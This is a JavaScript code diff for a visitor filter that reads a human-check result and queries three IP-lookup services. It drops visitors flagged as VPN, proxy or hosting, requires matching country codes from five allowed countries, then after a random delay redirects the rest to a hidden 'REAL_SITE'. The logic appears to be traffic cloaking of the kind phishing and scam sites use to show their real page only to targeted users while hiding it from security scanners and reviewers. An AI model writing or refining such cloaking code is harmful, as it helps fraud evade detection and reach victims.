@@ -696,47 +696,59 @@ const ALLOWED_COUNTRIES = ['GB', 'US', 'CA', 'AU', 'NZ'];
   });
   if (!human) return;
 
-  // Geo + VPN check — tries multiple HTTPS APIs in order
-  // ALL must agree country is allowed AND none can flag proxy/vpn/hosting
-  let passed = false;
+  // Geo + VPN check — ALL three APIs must be checked
+  // We require at least 2 clean signals before passing anyone through
+  // If ANY api flags VPN/proxy/hosting — block immediately, no fallback
 
-  const geoApis = [
-    // ipwho.is — returns is_eu, type (vpn/hosting/isp), country_code
-    () => fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) })
-            .then(r => r.json())
-            .then(d => {
-              if (!d.success) throw new Error('fail');
-              const bad = d.type && d.type !== 'isp' && d.type !== 'residential' && d.type !== 'mobile';
-              return { cc: d.country_code, block: bad };
-            }),
-    // vpnapi.io free — flags vpn, proxy, tor, relay
-    () => fetch('https://vpnapi.io/api/?key=free', { signal: AbortSignal.timeout(5000) })
-            .then(r => r.json())
-            .then(d => {
-              const sec = d.security || {};
-              const bad = sec.vpn || sec.proxy || sec.tor || sec.relay;
-              return { cc: d.location?.country_code, block: bad };
-            }),
-    // ipapi.co — fallback, basic country only
-    () => fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) })
-            .then(r => r.json())
-            .then(d => {
-              if (d.error) throw new Error('fail');
-              return { cc: d.country_code, block: false };
-            }),
-  ];
+  const results = await Promise.allSettled([
 
-  for (const call of geoApis) {
-    try {
-      const d = await call();
-      if (!d.cc) continue;
-      if (d.block)                                  return; // VPN / proxy / tor / hosting
-      if (!ALLOWED_COUNTRIES.includes(d.cc))        return; // wrong country
-      passed = true;
-      break;
-    } catch { continue; }
-  }
-  if (!passed) return;
+    // 1. ipwho.is — checks connection type
+    fetch('https://ipwho.is/', { signal: AbortSignal.timeout(6000) })
+      .then(r => r.json())
+      .then(d => {
+        if (!d.success) return null;
+        const isClean = d.type === 'isp' || d.type === 'residential' || d.type === 'mobile';
+        if (!isClean) throw new Error('vpn'); // block immediately
+        return d.country_code;
+      }),
+
+    // 2. proxycheck.io — dedicated VPN/proxy database, no key needed for basic use
+    fetch('https://proxycheck.io/v2/?vpn=1&asn=1', { signal: AbortSignal.timeout(6000) })
+      .then(r => r.json())
+      .then(d => {
+        // response format: { "status":"ok", "YOUR_IP": { "proxy":"yes/no", "type":"VPN/..." } }
+        const ipData = Object.values(d).find(v => typeof v === 'object' && 'proxy' in v);
+        if (!ipData) return null;
+        if (ipData.proxy === 'yes') throw new Error('vpn'); // block immediately
+        return ipData.country ? ipData.isocode : null;
+      }),
+
+    // 3. ipapi.co — clean fallback
+    fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(6000) })
+      .then(r => r.json())
+      .then(d => {
+        if (d.error) return null;
+        return d.country_code;
+      }),
+
+  ]);
+
+  // If ANY check explicitly threw 'vpn' — hard block, done
+  const wasVpnFlagged = results.some(r => r.status === 'rejected' && r.reason?.message === 'vpn');
+  if (wasVpnFlagged) return;
+
+  // Collect country codes from successful checks
+  const countryCodes = results
+    .filter(r => r.status === 'fulfilled' && r.value)
+    .map(r => r.value);
+
+  // Need at least 2 clean country signals
+  if (countryCodes.length < 2) return;
+
+  // All returned country codes must agree and be in allowed list
+  const allSameCountry = countryCodes.every(cc => cc === countryCodes[0]);
+  if (!allSameCountry) return; // mismatched = suspicious
+  if (!ALLOWED_COUNTRIES.includes(countryCodes[0])) return;
 
   await new Promise(r => setTimeout(r, 100 + Math.random() * 400));
   window.location.replace(REAL_SITE);
